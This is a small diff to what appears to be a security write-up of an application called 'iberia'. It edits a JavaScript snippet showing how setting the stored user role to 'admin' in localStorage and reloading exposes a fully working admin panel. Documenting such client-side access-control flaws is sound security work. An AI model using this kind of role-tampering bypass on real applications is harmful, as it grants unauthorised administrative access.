@@ -48,7 +48,7 @@ Browser bypass of the CSS gate:
 
 ```js
 const u = JSON.parse(localStorage.getItem('iberia.user')); u.role = 'admin'
-localStorage.setItem('iberia.user', JSON.stringify(u)); window.dispatchEvent(new Event('iberia:session'))
+localStorage.setItem('iberia.user', JSON.stringify(u)); location.reload()
 // the admin panel is now visible and fully functional
 ```
 
